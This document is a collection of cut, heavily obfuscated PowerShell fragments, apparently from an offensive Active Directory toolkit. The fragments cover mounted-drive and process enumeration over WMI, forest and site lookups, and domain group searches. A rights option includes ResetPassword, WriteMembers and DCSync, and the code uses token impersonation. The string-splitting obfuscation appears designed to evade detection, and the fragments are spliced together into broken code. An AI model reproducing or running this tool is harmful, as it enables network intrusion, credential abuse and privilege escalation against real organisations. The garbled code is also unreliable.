    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{3}{8}{6}{7}{11}{2}{10}{0}{12}{5}{9}{1}{4}Z3b -fS5zrS5z,S5zctiS5z,S5zsFS5z,S5zPSUsS5z,S5zonsS5z,S5ztateChaS5z,S5zuldProS5z,S5zcS5z,S5zeShoS5z,S5zngingFunS5z,S5zoS5z,S5zesS5z,S5zSS5z}, S5zS5z)]
    [Diagnostics.CodeAnalysi','
    }

    PROCESS {
        if (YoV{Ps','e} JGO &(Z3b{1}{2}{0}Z3b-f S5zd-MemberS5z,S5zAS5z,S5zdS5z) (Z3b{0}{1}{3}{2}Z3b -fS5zNS5z,S5zoS5z,S5zrtyS5z,S5ztepropeS5z) (Z3b{1}{2}{0}Z3b-fS5zIDS5z,S5zUserS5z,S5zSS5z) YoV{uSIJKERIJKsID}
                                YoV{moUNIJKTeDIJKDRIvE} JGO &(Z3b{1}{2}{0}Z3b -fS5zrS5z,S5zAdd-MemS5z,S5zbeS5z) (Z3b{1}{0}{2}Z3b-f S5ztS5z,S5zNoteproperS5z,S5zyS5z) (Z3b{3}{2}{0}{1}Z3b -f S5zetS5z,S5zterS5z,S5zriveLS5z,S5zDS5z) YoV{dRiIJKVeIJKLetTIJKeR}
                                YoV{moIJKUNtEDIJKDIJKRiVe} JGO &(Z3b{0}{2}{1}Z3b-fS5zAdd-MeS5z,S5zerS5z,S5zmbS5z) (Z3b{2}{0}{1}Z3b -fS5zotepropeS5z,S5zrtyS5z,S5zNS5z) (Z3b{3}{2}{0}{1}Z3b-f S5zerNS5z,S5zameS5z,S5zovidS5z,S5zPrS5z) YoV{PRoIJKVIJKIdeIJKRnaME}
                                YoV{MIJKoIJKUIJKNtEDDrIve} JGO &(Z3b{1}{0}{2}Z3b -fS5zd-MeS5z,S5zAdS5z,S5zmberS5z) (Z3b{1}{3}{0}{2}Z3b -fS5zroS5z,S5zNoS5z,S5zpertyS5z,S5ztepS5z) (Z3b{1}{2}{0}Z3b-fS5zPathS5z,S5zRemotS5z,S5zeS5z) YoV{RIJKeMIJKOteIJKpATh}
                                YoV{MouIJKNTIJKeIJKDdRiVE} JGO &(Z3b{2}{1}{3}{0}Z3b-fS5z-MemberS5z,S5zdS5z,S5zAS5z,S5zdS5z) (Z3b{2}{0}{1}Z3b-fS5ztepropS5z,S5zertyS5z,S5zNoS5z) (Z3b{1}{2}{0}{3}Z3b -f S5zrNaS5z,S5zDriveS5z,S5zUseS5z,S5zmeS5z) YoV{drIJKiVeIJKUsEIJKRNAIJKmE}
                                YoV{mouIJKNTEDDrIJKIve}.Z3bpsobIJKjIJKECTZ3b.Z3btIJKYIJKPENIJKAMeSZ3b.(Z3b{1}{0}Z3b -f S5zertS5z,S5zInsS5z).Invoke(0, (Z3b{4}{5}{7}{6}{0}{1}{3}{2}Z3b -fS5zMouS5z,S5znS5z,S5zdDriveS5z,S5zteS5z,S5zPoS5z,S5zwS5z,S5zView.RegS5z,S5zerS5z))
                                YoV{moIJKUNtIJKEIJKdDriVe}
                            }
                        }
                    }
                    catch {
                        &(Z3b{1}{2}{0}{3}Z3b-fS5zboS5z,S5zWS5z,S5zrite-VerS5z,S5zseS5z) (S5z[Get-WMIRegS5z+S5zMS5z+S5zoS5z+S5zuntS5z+S5zedS5z+S5zDrive] S5z+S5zError:S5z+S5z S5z+Z3bYoV_Z3b)
                    }
                }
            }
            catch {
                &(Z3b{0}{2}{1}{3}Z3b -f S5zWrite-S5z,S5ziS5z,S5zWarnS5z,S5zngS5z) (S5z[Get-S5z+S5zWMS5z+S5zIS5z+S5zRS5z+S5zeS5z+S5zgMountedDrS5z+S5zivS5z+S5ze] S5z+S5zES5z+S5zrror S5z+S5zacS5z+S5zceS5z+S5zssinS5z+S5zg S5z+Z3bYoVComputer, Z3b+S5zlS5z+S5zikely S5z+S5zinsufficienS5z+S5ztS5z+S5z S5z+S5zperS5z+S5zmissiS5z+S5zons S5z+S5zorS5z+S5z S5z+S5zfirewaS5z+S5zlS5z+S5zl S5z+S5zruS5z+S5zles S5z+S5zoS5z+S5zn S5z+S5zhost:S5z+S5z S5z+Z3bYoV_Z3b)
            }
        }
    }
}


function gIJKeTIJK-WmipIJKROcESS {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{2}{1}{3}{0}Z3b-f S5zldProcessS5z,S5zhS5z,S5zPSSS5z,S5zouS5z}, S5zS5z)]
    [OutputType({Z3b{3}{4}{0}{5}{2}{1}Z3b -fS5zieS5z,S5zsS5z,S5zcesS5z,S5zPowerS5z,S5zVS5z,S5zw.UserProS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(posItion = 0, VaLUEFrompiPeliNE = YoV{tRIJKUE}, VALUefRompipElineByprOpErtYNAme = YoV{trIJKUE})]
        [Alias({Z3b{1}{0}{2}Z3b -f S5ztS5','entialAttribute()]
                YoV{CReIJKDEnIJKTIIJKAL} =  (  &(Z3b{0}{1}{2}Z3b -f S5zVarIS5z,S5zAS5z,S5zbleS5z)  (Z3bjZ3b+Z3bFIZ3b)  -vaLuEoNly  )::Z3beIJKmpTYZ3b
            )

            YoV{dFSIJKsEaIJKRChEr} = &(Z3b{5}{4}{0}{1}{3}{2}Z3b -fS5zeS5z,S5zaS5z,S5zherS5z,S5zrcS5z,S5zet-DomainSS5z,S5zGS5z) @PSBoundParameters

            if (YoV{dfIJKSseaIJKRIJKcHER}) {
                YoV{DIJKFIJKSshIJK','     }
        }
    }
}


function GIJKeT-fIJKOreSt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({Z3b{0}{1}{3}{2}Z3b-f S5zPSS5z,S5zShouldPS5z,S5zcessS5z,S5zroS5z}, S5zS5z)]
    [OutputType({Z3b{5}{2}{3}{1}{6}{4}{0}Z3b -f S5zectS5z,S5zoS5z,S5zManaS5z,S5zgement.AutomatiS5z,S5zSCustomObjS5z,S5zSystem.S5z,S5zn.PS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItiOn = 0, vALuefRoMPipeline = YoV{tIJKRUe})]
 ','z,S5zisS5z,S5zDS5z}, {Z3b{4}{1}{2}{0}{3}Z3b -f S5zNS5z,S5zamS5z,S5zAccountS5z,S5zameS5z,S5zSS5z}, {Z3b{1}{0}Z3b-fS5zameS5z,S5zNS5z}, {Z3b{2}{5}{3}{4}{0}{1}Z3b-f S5ztinguishedNS5z,S5zameS5z,S5zMS5z,S5zbS5z,S5zerDisS5z,S5zemS5z}, {Z3b{0}{2}{1}Z3b -fS5zMemS5z,S5zeS5z,S5zberNamS5z})]
        [String[]]
        YoV{idIJKenIJKTITy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKMIJKAin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{0}Z3b-f S5zilterS5z,S5zFS5z})]
        [String]
        YoV{LDaIJKPFIJKILTIJKer},

        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{propIJKeRtIJKIES},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-fS5zADSPS5z,S5zathS5z})]
        [String]
        YoV{sEAIJKRIJKChbaIJKSe},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{4}{3}{0}{2}{1}Z3b -fS5ztS5z,S5zerS5z,S5zrollS5z,S5zainConS5z,S5zDomS5z})]
        [String]
        YoV{SERIJKVER},

        [ValidateSet({Z3b{1}{0}Z3b-f S5zseS5z,S5zBaS5z}, {Z3b{0}{1}{2}Z3b-fS5zOnS5z,S5zeLevS5z,S5zelS5z}, {Z3b{1}{0}{2}Z3b-f S5zubtreS5z,S5zSS5z,S5zeS5z})]
        [String]
        YoV{sEaRCHSIJKCIJKOPE} = (Z3b{1}{2}{0}Z3b -f S5zbtreeS5z,S5zSS5z,S5zuS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RIJKesIJKULIJKTpIJKAGeSizE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{seIJKRVIJKeRtiMIJKeLImIT},

        [Switch]
        YoV{tOMIJKBsIJKToNe},

        [Management.Automation.PSCredenti','3}Z3b -fS5zViewS5z,S5zdS5z,S5zminAccS5z,S5zessS5z,S5zPowerS5z,S5z.AS5z))
            YoV{IsaIJKDmIN}
        }
    }

    END {
        if (YoV{loGoNtIJKOIJKKen}) {
            &(Z3b{1}{0}{2}{3}{5}{4}Z3b-fS5znvoke-RS5z,S5zIS5z,S5zeS5z,S5zvertS5z,S5zoSelfS5z,S5zTS5z) -TokenHandle YoV{lIJKOGONIJKTokEN}
        }
    }
}


function GIJKEt-NeIJKTCIJKOMpUTErIJKsitEnAME {


    [OutputType({Z3b{3}{4}{2}{1}{0}{6}{5}Z3b -fS5zmS5z,S5zoS5z,S5zerView.CS5z,S5zPoS5z,S5zwS5z,S5zeS5z,S5zputerSitS5z})]
    [CmdletBinding()]
    Param(
        [Parameter(posiTIon = 0, VALUefroMPIPeLine = YoV{TRIJKUe}, VALUefroMPIpelInEByPRoPErTYName = YoV{TIJKRUE})]
        [Alias({Z3b{0}{2}{1}Z3b-f S5zHS5z,S5ztNameS5z,S5zosS5z}, {Z3b{0}{1}{2}Z3b-f S5zdnsS5z,S5zhostS5z,S5znameS5z}, {Z3b{1}{0}Z3b -f S5zameS5z,S5znS5z})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        YoV{cOMIJKPutIJKername} = (Z3b{0}{2}{1}Z3b -f S5zlocS5z,S5ztS5z,S5zalhosS5z),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CRedeNIJKTiIJKAl} =   YoV{jIJKFi}::Z3bemIJKptyZ3b
    )

    BEGIN {
        if (YoV{pIJKSIJKBOuIJKNdPIJKArAmeTERs}[(Z3b{2}{1}{0}Z3b -fS5zalS5z,S5zdentiS5z,S5zCreS5z)]) {
            YoV{lOIJKgontoKIJKEn} = &(Z3b{0}{4}{1}{6}{2}{5}{3}Z3b -f S5zIS5z,S5zvoke-S5z,S5zrS5z,S5zpersonationS5z,S5znS5z,S5zImS5z,S5zUseS5z) -Credential YoV{CrIJKedIJKeNTIJKIAL}
        }
    }

    PROCESS {
        ForEach (YoV{CoMIJKputeR} in YoV{COMpIJKUTIJKerIJKNaIJKME}) {
            
            if (YoV{cIJKOmIJKPuteR} -match S5z^(?:[0-9]{1,3}5rj.){3}[0-9]{1,3}YoVS5z) {
                YoV{ipaDdRIJKeIJKSS} = YoV{cIJKOMpIJKUIJKTER}
                YoV{COIJKmpUTIJKEr} =  ( &(Z3b{3}{1}{2}{0}Z3b -fS5zES5z,S5zt-vARiS5z,S5zAblS5z,S5zGES5z) jQ2g).Z3bVIJKAlueZ3b::(Z3b{0}{3}{2}{1}Z3b-f S5zGeS5z,S5zressS5z,S5ztByAddS5z,S5ztHosS5z).Invoke(YoV{cIJKomIJKpUteR}) JGO &(Z3b{2}{1}{0}Z3b -f S5zctS5z,S5zt-ObjeS5z,S5zSelecS5z) -ExpandProperty (Z3b{0}{2}{1}Z3b-fS5zHostS5z,S5zameS5z,S5zNS5z)
            }
            else {
                YoV{IPaddIJKRIJKEsS} = @(&(Z3b{2}{5}{1}{0}{4}{3}Z3b-fS5zve-S5z,S5zolS5z,S5zReS5z,S5zressS5z,S5zIPAddS5z,S5zsS5z) -ComputerName YoV{coIJKMpIJKUtEr})[0].Z3bIIJKPaIJKdDRESSZ3b
            }

            YoV{PIJKTrINIJKFO} =   (&(Z3b{0}{3}{1}{2}Z3b -f S5zGeS5z,S5zariAbLS5z,S5zeS5z,S5zT-VS5z) 6Rk25p -vAlU)::Z3bzIJKeroZ3b

            YoV{ReIJKSUIJKLt} = YoV{neTIJKAPIIJK32}::Z3bdIJKsGIJKeTSiTEIJKNAMeZ3b(YoV{CIJKOMPUtIJKeR}, [ref]YoV{PIJKTIJKRInFO})

            YoV{coMIJKpIJKUTeRSIte} = &(Z3b{1}{2}{0}Z3b -f S5ztS5z,S5zNew-ObS5z,S5zjecS5z) (Z3b{1}{2}{0}Z3b-f S5ztS5z,S5zPSObjeS5z,S5zcS5z)
            YoV{COIJKmputerIJKsITE} JGO &(Z3b{2}{1}{0}Z3b -f S5zrS5z,S5zembeS5z,S5zAdd-MS5z) (Z3b{3}{0}{2}{1}Z3b -f S5ztS5z,S5zropertyS5z,S5zepS5z,S5zNoS5z) (Z3b{2}{1}{3}{0}Z3b -fS5zeS5z,S5zputerNS5z,S5zComS5z,S5zamS5z) YoV{CoMputIJKer}
            YoV{cIJKOIJKMpUIJKTErsITE} JGO &(Z3b{0}{1}{2}Z3b-fS5zAdd-MeS5z,S5zmS5z,S5zberS5z) (Z3b{1}{3}{0}{2}Z3b-fS5zoS5z,S5zNotS5z,S5zpertyS5z,S5zeprS5z) (Z3b{0}{1}Z3b -fS5zIPAddresS5z,S5zsS5z) YoV{IpADIJKDrIJKeIJKSs}

            if (YoV{rIJKESUIJKLt} -eq 0) {
                YoV{sIIJKTenAIJKmE} =   YoV{dSIJKm3}::(Z3b{0}{2}{1}{3}Z3b -fS5zPtrToSS5z,S5zinS5z,S5ztrS5z,S5zgAutoS5z).Invoke(YoV{pTrIIJKN','3b-fS5zTS5z,S5znt64S5z,S5zoIS5z).Invoke()

                YoV{mEmIJKBIJKeRs} = @()

                
                if ((YoV{reSIJKUlT} -eq 0) -and (YoV{OfIJKFsIJKeT} -gt 0)) {

                    
               ','  [String[]]
        YoV{PIJKRinIJKCIJKipAlidEnIJKTIJKity},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{PRIJKiIJKNcIJKipALdIJKOmAiN},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{1}{2}{0}{3}Z3b-fS5zontS5z,S5zDomainS5z,S5zCS5z,S5zrollerS5z})]
        [String]
        YoV{SerVIJKER},

        [ValidateSet({Z3b{0}{1}Z3b-fS5zBaS5z,S5zseS5z}, {Z3b{0}{2}{1}Z3b -f S5zOnS5z,S5zelS5z,S5zeLevS5z}, {Z3b{0}{1}Z3b -fS5zSubtrS5z,S5zeeS5z})]
        [String]
        YoV{seArCIJKHIJKscIJKoPE} = (Z3b{0}{1}{2}Z3b-fS5zSS5z,S5zubtreS5z,S5zeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{ResUIJKLTPAgEsIJKize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{seRvIJKERTIMIJKeliMIJKit},

        [Switch]
        YoV{tOMIJKBIJKSIJKTOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crIJKEdenIJKTIIJKAl} =   YoV{JIJKFI}::Z3bEMPIJKTyZ3b,

        [ValidateSet(S5zAllS5z, {Z3b{1}{0}{2}Z3b-fS5zsetS5z,S5zReS5z,S5zPasswordS5z}, {Z3b{2}{0}{1}Z3b-fS5zerS5z,S5zsS5z,S5zWriteMembS5z}, {Z3b{1}{2}{0}Z3b -f S5zcS5z,S5zDS5z,S5zCSynS5z})]
        [String]
        YoV{RIJKiGHtS} = S5zAllS5z,

        [Guid]
        YoV{RIIJKghIJKTIJKSGuid}
    )

    BEGIN {
        YoV{TArIJKgeTSeIJKArCHIJKERarGuIJKMentS} = @{
            (Z3b{2}{1}{3}{0}Z3b -fS5zertiesS5z,S5zroS5z,S5zPS5z,S5zpS5z) = (Z3b{0}{2}{3}{1}{4}Z3b-fS5zdistS5z,S5zhednS5z,S5zinguiS5z,S5zsS5z,S5zameS5z)
            S5zRawS5z = YoV{TrIJKUe}
        }
        if (YoV{pIJKsbOUNDPAIJKRaMIJKEteIJKRS}[(Z3b{2}{0}{1}{3}Z3b-f S5zeS5z,S5ztDoS5z,S5zTargS5z,S5zmainS5z)]) { YoV{TIJKArGEtIJKsEarIJKCHEIJKRIJKArgUmENIJKTs}[(Z3b{0}{1}Z3b-f S5zDomaiS5z,S5znS5z)] = YoV{tIJKAIJKRGEtdOMAin} }
        if (YoV{pSBouIJKNdIJKPIJKAramEIJKTeIJKRs}[(Z3b{1}{2}{0}{4}{3}Z3b -f S5zDS5z,S5zTS5z,S5zargetLS5z,S5zilterS5z,S5zAPFS5z)]) { YoV{TIJKArIJKgIJKeTIJKsEARIJKCHerARgUIJKmIJKENtS}[(Z3b{2}{0',').(Z3b{1}{2}{0}Z3b-f S5zrrayS5z,S5zToBytS5z,S5zeAS5z).Invoke() JGO &(Z3b{1}{0}{2}Z3b-f S5zorEachS5z,S5zFS5z,S5z-ObjectS5z) { S5z5rjS5z + YoV{_}.(Z3b{0}{1}{2}Z3b-f S5zTS5z,S5zoStriS5z,S5zngS5z).Invoke(S5zX2S5z) }) -join S5zS5z
                        YoV{iDIJKenIJKTiTyIJKFIltER} += Z3b(objectguid=YoVGuidByteString)Z3b
                    }
                    elseif (YoV{idIJKenIJKTIJKitIJKYINstAIJKNCe}.(Z3b{1}{0}{2}Z3b -fS5zoS5z,S5zCS5z,S5zntainsS5z).Invoke(S5z5rjS5z)) {
                        YoV{cONIJKVERteIJKDIJKiDEIJKNTItYINstaIJKNIJKCe} = YoV{IIJKdEnTIJKIIJKTYiNSTancE}.(Z3b{0}{1}Z3b -f S5zReS5z,S5zplaceS5z).Invoke(S5z5rj28S5z, S5z(S5z).(Z3b{0}{1}Z3b -fS5zRS5z,S5zeplaceS5z).Invoke(S5z5rj29S5z, S5z)S5z) JGO &(Z3b{1}{2}{0}{3}Z3b-fS5z-ADNaS5z,S5zConS5z,S5zvertS5z,S5zmeS5z) -OutputType (Z3b{2}{0}{1}Z3b-f S5zoniS5z,S5zcalS5z,S5zCanS5z)
                        if (YoV{cIJKoIJKNvEIJKRTeDIJKIdENtiIJKTYINStanIJKCE}) {
                            YoV{gIJKRIJKoupIJKDoMAin} = YoV{cIJKonIJKVERIJKTEIJKdidEIJKNtITIJKYINStaIJKNCe}.(Z3b{0}{1}{2}Z3b-f S5zSubStrS5z,S5zinS5z,S5zgS5z).Invoke(0, YoV{cONverIJKTIJKediIJKDentIJKiTYIJKiNstaNcE}.(Z3b{2}{1}{0}Z3b-f S5zfS5z,S5zdexOS5z,S5zInS5z).Invoke(S5z/S5z))
                            YoV{GIJKROupnIJKAm','      try {
                
                YoV{rIJKEg} =   (  &(Z3b{0}{3}{1}{2}Z3b -f S5zCS5z,S5zES5z,S5zMS5z,S5zhILdITS5z)  VaRIabLE:o3Z6Q ).Z3bVAIJKLueZ3b::(Z3b{3}{2}{0}{4}{1}Z3b-fS5zemotS5z,S5zyS5z,S5znRS5z,S5zOpeS5z,S5zeBaseKeS5z).Invoke((Z3b{1}{0}Z3b -f S5zsersS5z,S5zUS5z), Z3bYoVComputerNameZ3b)

                
                YoV{rIJKeg}.(Z3b{3}{0}{2}{1}Z3b -fS5zubKeyS5z,S5zmesS5z,S5zNaS5z,S5zGetSS5z).Invoke() JGO &(Z3b{2}{0}{3}{1}Z3b-fS5zhS5z,S5zctS5z,S5zWS5z,S5zere-ObjeS5z) { YoV{_} -match (((S5zSS5z+S5z-1-5-21-S5z+S5z[S5z+S5z0-S5z+S5z9]+-S5z+S5z[S5z+S5z0-9]+-[S5z+S5z0-S5z+S5z9]+-[0-9]+S5z+S5zDmCS5z)  -crEpLACe([CHAr]68+[CHAr]109+[CHAr]67),[CHAr]36)) } JGO &(Z3b{2}{3}{0}{1}Z3b-f S5zcS5z,S5zh-ObjectS5z,S5zFoS5z,S5zrEaS5z) {
                    YoV{UsEIJKRNAMe} = &(Z3b{3}{0}{1}{4}{2}Z3b-f S5zromS5z,S5z-S5z,S5zDS5z,S5zConvertFS5z,S5zSIS5z) -ObjectSID YoV{_} -OutputType (Z3b{3}{2}{0}{1}Z3b -f S5zmainSimpS5z,S5zleS5z,S5zoS5z,S5zDS5z)

                    if (YoV{uIJKseRNIJKAmE}) {
                        YoV{UsEIJKRnIJKAIJKme}, YoV{usErIJKdomAIJKiN} = YoV{UsEIJKRNIJKAme}.(Z3b{0}{1}Z3b-f S5zSpliS5z,S5ztS5z).Invoke(S5z@S5z)
                    }
                    else {
                        YoV{uSEIJ','                   YoV{cOnveIJKRIJKTEdIJKIDEnTItIJKyIJKInSTAIJKNcE} = YoV{iDeNTIJKITYIIJKNsTIJKAIJKNCe}.(Z3b{1}{0}Z3b -fS5zeplaceS5z,S5zRS5z).Invoke(S5z5rj28S5z, S5z(S5z).(Z3b{0}{2}{1}Z3b -fS5zRepS5z,S5zeS5z,S5zlacS5z).Invoke(S5z5rj29S5z, S5z)S5z) JGO &(Z3b{1}{2}{0}{3}Z3b-f S5zvert-S5z,S5zCS5z,S5zonS5z,S5zADNameS5z) -OutputType (Z3b{2}{0}{1}Z3b-f S5znicaS5z,S5zlS5z,S5zCanoS5z)
                        if (YoV{CoNvIJKERteDIJKIIJKdeNtIIJKTyINsTAnCe}) {
                            YoV{GIJKRoIJKUpdOMIJKAin} = YoV{cOIJKNVERteIJKdIdIJKeIJKNTITIJKYInIJKSIJKTAnce}.(Z3b{2}{0}{1}Z3b-f S5zbS5z,S5zStringS5z,S5zSuS5z).Invoke(0, YoV{CIJKOIJKNvERtIJKEDiDEnTiTYIIJKNsTIJKAnce}.(Z3b{0}{1}Z3b -fS5zIndS5z,S5zexOfS5z).Invoke(S5z/S5z))
                            YoV{GrIJKOIJKUpNaME} = YoV{IDeIJKNtIIJKTYIJKinsIJKTANIJKcE}.(Z3b{0}{1}Z3b -fS5zSplS5z,S5zitS5z).Invoke(S5z5rjS5z)[1]
                            YoV{IDeIJKNTItYFiLtIJKeR} += Z3b(samAccountName=YoVGroupName)Z3b
                            YoV{SEIJKArIJKchIJKeIJKRaIJKRgUMEnts}[(Z3b{0}{1}Z3b -fS5zDomaS5z,S5zinS5z)] = YoV{GRoUIJKpDOIJKmIJKAin}
                            &(Z3b{1}{3}{4}{0}{2}Z3b-f S5zeS5z,S5zWS5z,S5zrboseS5z,S5zrS5z,S5zite-VS5z) (S5z[GS5z+S5zet-DoS5z+S5zmaS5z+S5zinGS5z+S5zroS5z+S5zup] S5z+S5zExS5z+S5ztrS5z+S5zacted S5z+S5zdoS5z+S5zmain S5z+Z3bS5zYoVGroupDomainS5z Z3b+S5zfroS5z+S5zm S5z+Z3bS5zYoVIdentityInstanceS5zZ3b)
                            YoV{gROIJKUPSeaIJKRCIJKher} = &(Z3b{1}{3}{0}{2}Z3b-f S5zSeaS5z,S5zGet-DS5z,S5zrcherS5z,S5zomainS5z) @SearcherArguments
                        }
                    }
                    else {
                        YoV{IdIJKENTITyIJKFiLTIJKer} += Z3b(JGO(samAccountName=YoVIdentityInstance)(name=YoVIdentityInstance))Z3b
                    }
                }

                if (YoV{idENTiIJKTyFIJKiLIJKTer} -and (YoV{iIJKDIJKeIJKNtITYFiLIJKTer}.(Z3b{0}{1}Z3b -fS5zTriS5z,S5zmS5z).Invoke() -ne S5zS5z) ) {
                    YoV{FIJKiLIJKTer} += Z3b(JGOYoVIdentityFilter)Z3b
                }

                if (YoV{psBounIJKdpIJKARIJKAmEterS}[(Z3b{3}{0}{1}{2}Z3b -fS5zdminS5z,S5zCoS5z,S5zuntS5z,S5zAS5z)]) {
                    &(Z3b{2}{3}{1}{0}Z3b -f S5zrboseS5z,S5zeS5z,S5zWrS5z,S5zite-VS5z) (Z3b{6}{3}{1}{9}{7}{0}{4}{2}{8}{5}Z3b-fS5z] Searching fS5z,S5zGrS5z,S5zaS5z,S5znS5z,S5zor S5z,S5zunt=1S5z,S5z[Get-DomaiS5z,S5zpS5z,S5zdminCoS5z,S5zouS5z)
                    YoV{FIJKIIJKlTEr} += ((Z3b{3}{0}{2}{1}Z3b -fS5zadmiS5z,S5z1)S5z,S5zncount=S5z,S5z(S5z))
                }
                if (YoV{PSbIJKouNdPArIJKAmetIJKErs}[(Z3b{2}{1}{0}Z3b-fS5zpeS5z,S5zroupScoS5z,S5zGS5z)]) {
                    YoV{GIJKROuIJKPScIJKopIJKEvalUE} = YoV{PSbIJKOuIJKNIJKDPARaMETeRs}[(Z3b{1}{0}{2}Z3b -f S5zrouS5z,S5zGS5z,S5zpScopeS5z)]
                    YoV{fIJKILTeR} = Switch (YoV{GIJKROupsIJKcOIJKpEVIJKALuE}) {
                        (Z3b{2}{1}{0}Z3b-fS5zocalS5z,S5zomainLS5z,S5zDS5z)       { (Z3b{0}{8}{5}{4}{10}{7}{11}{9}{1}{6}{3}{2}Z3b -f S5z(gS5z,S5z6.1.S5z,S5z)S5z,S5z.803:=4S5z,S5zType:1.2.84S5z,S5zpS5z,S5z4S5z,S5z11S5z,S5zrouS5z,S5z55S5z,S5z0.S5z,S5z3S5z) }
                        (Z3b{3}{0}{1}{2}Z3b -f S5zomaiS5z,S5znS5z,S5zLocalS5z,S5zNotDS5z)    { (Z3b{4}{1}{2}{0}{3}{5}{6}Z3b -fS5zpe:1.2S5z,S5zupTS5z,S5zyS5z,S5z.840.113S5z,S5z(!(groS5z,S5z556.1.S5z,S5z4.803:=4))S5z) }
                        (Z3b{0}{1}Z3b-f S5zGloS5z,S5zbalS5z)            { (Z3b{3}{2}{9}{5}{8}{6}{1}{0}{7}{4}{10}Z3b-f S5z13556S5z,S5z.840.1S5z,S5zgS5z,S5z(S5z,S5z8S5z,S5zupTyS5z,S5z.2S5z,S5z.1.4.S5z,S5zpe:1S5z,S5zroS5z,S5z03:=2)S5z) }
                        (Z3b{2}{0}{1}{3}Z3b -fS5ztGlS5z,S5zoS5z,S5zNoS5z,S5zbalS5z)         { (Z3b{3}{2}{1}{0}{6}{4}{5}Z3b -f S5ze:S5z,S5zypS5z,S5zoupTS5z,S5z(!(grS5z,S5z.803S5z,S5z:=2))S5z,S5z1.2.840.113556.1.4S5z) }
                        (Z3b{0}{1}Z3b -f S5zUnS5z,S5ziversalS5z)         { ((Z3b{4}{7}{6}{1}{5}{3}{9}{8}{2}{0}Z3b -fS5z:=8)S5z,S5zpTyS5z,S5z.803S5z,S5ze:1.S5z,S5z(grS5z,S5zpS5z,S5zuS5z,S5zoS5z,S5z4S5z,S5z2.840.113556.1.S5z)) }
                        (Z3b{2}{1}{0}Z3b-f S5zsalS5z,S5ztUniverS5z,S5zNoS5z)      { (((Z3b{3}{4}{7}{5}{1}{6}{2}{0}Z3b-fS5z=8))S5z,S5z1.2.840.1135S5z,S5z03:S5z,S5z(!(S5z,S5zgroupS5z,S5zpe:S5z,S5z56.1.4.8S5z,S5zTyS5z))) }
                    }
                    &(Z3b{2}{0}{1}Z3b -fS5zte-VerbosS5z,S5zeS5z,S5zWriS5z) (S5z[GeS5z+S5zt-DoS5z+S5zmS5z+S5zaS5z+S5zinGrS5z+S5zoup] S5z+S5zSS5z+S5zeS5z+S5zarching S5z+S5zfS5z+S5zor S5z+S5zgS5z+S5zrS5z+S5zoup S5z+S5zscS5z+S5zope S5z+Z3bS5zYoVGroupScopeValueS5zZ3b)
                }
                if (YoV{pSIJKBOuNIJKdPIJKARAIJKmEtEIJKRS}[(Z3b{1}{0}{2}Z3b -f S5zpertS5z,S5zGroupProS5z,S5zyS5z)]) {
                    YoV{gRIJKOUPIJKProperTyVIJKALuE} = YoV{pIJKSboUNdIJKPaIJKRAmETers}[(Z3b{1}{3}{0}{2}Z3b-f S5zupS5z,S5zGS5z,S5zPropertyS5z,S5zroS5z)]
                    YoV{FiIJKltIJKEr} = Switch (YoV{grOUIJKpproPIJKeRtIJKYVaIJKlUe}) {
                        (Z3b{1}{2}{0}Z3b -f S5zityS5z,S5zSecuS5z,S5zrS5z)              { ((Z3b{7}{4}{3}{6}{0}{10}{5}{12}{8}{9}{1}{11}{2}Z3b -f S5z.840.S5z,S5z.803:=2147S5z,S5z48)S5z,S5z.S5z,S5zType:1S5z,S5z13S5z,S5z2S5z,S5z(groupS5z,S5z5S5z,S5z6.1.4S5z,S5z1S5z,S5z4836S5z,S5z5S5z)) }
                        (Z3b{2}{1}{0}Z3b -fS5zibutionS5z,S5zrS5z,S5zDistS5z)          { (Z3b{3}{6}{13}{1}{4}{8}{10}{2}{14}{12}{5}{7}{0}{9}{11}Z3b -fS5z214748S5z,S5zoupS5z,S5z.2.840S5z,S5z(!S5z,S5zTypeS5z,S5z4S5z,S5z(S5z,S5z.803:=S5z,S5z:S5z,S5z364S5z,S5z1S5z,S5z8))S5z,S5z1.S5z,S5zgrS5z,S5z.113556.S5z) }
                        (Z3b{0}{1}{3}{2}Z3b-f S5zCS5z,S5zreaS5z,S5zystemS5z,S5ztedBySS5z)       { ((Z3b{7}{5}{1}{3}{2}{4}{8}{6}{0}Z3b-f S5z)S5z,S5zpS5z,S5z3556.1.4S5','5zmainS5z,S5zDoS5z)]) {
            ForEach (YoV{TArIJKGetIJKdoIJKMaIn} in YoV{DIJKoMaIJKiN}) {
                YoV{SEArIJKcHeIJKRIJKARguMIJKenIJKTS}[(Z3b{0}{1}Z3b -fS5zDomaS5z,S5zinS5z)] = YoV{tIJKArIJKgETIJKdOMAIN}
                YoV{UseRIJKseARcIJKhEr} = &(Z3b{1}{3}{2}{0}Z3b -f S5zrS5z,S5zGeS5','on] pS5z,S5z state, token impersS5z,S5znoS5z,S5z[InvokeS5z)
    }

    if (YoV{PsIJKBIJKoUnDpAIJKRamEIJKTIJKERs}[(Z3b{2}{1}{0}Z3b -fS5zkenHandleS5z,S5zoS5z,S5zTS5z)]) {
        YoV{LogoNTOkIJKenHaIJKNIJKdLE} = YoV{tOIJKKenHAIJKNdIJKLE}
    }
    else {
        YoV{LOgOIJKNIJKTokIJKEIJKNHAnDle} =  (&(S5zlSS5z)  vaRiABle:6rk25P).Z3bvalIJKUEZ3b::Z3bZEIJKROZ3b
